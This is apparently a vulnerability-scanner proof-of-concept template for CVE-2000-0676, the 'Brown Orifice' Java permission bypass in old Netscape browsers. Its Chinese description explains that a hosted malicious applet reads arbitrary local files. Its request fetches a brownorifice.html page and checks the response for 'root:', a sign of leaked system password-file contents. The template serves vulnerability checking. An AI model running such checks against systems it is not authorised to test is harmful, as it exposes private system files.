[info]
author = "AVE"
description = "通过托管恶意 Java Applet（Brown Orifice），利用 Netscape 4.04-4.74 中 netscape.net.URLConnection 类未正确执行安全检查的漏洞，以 file:// 协议读取目标系统任意文件，验证 Netscape 浏览器是否存在 Java 权限绕过"
id = "POC-AVE-2000-0530"
name = "CVE-2000-0676 PoC"
severity = "medium"
tags = [
    "cve-2000-0676",
    "brown-orifice",
]
vuln_id = [
    "CVE-2000-0676",
    "AVE-2000-0530",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/brownorifice.html"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["root:"]
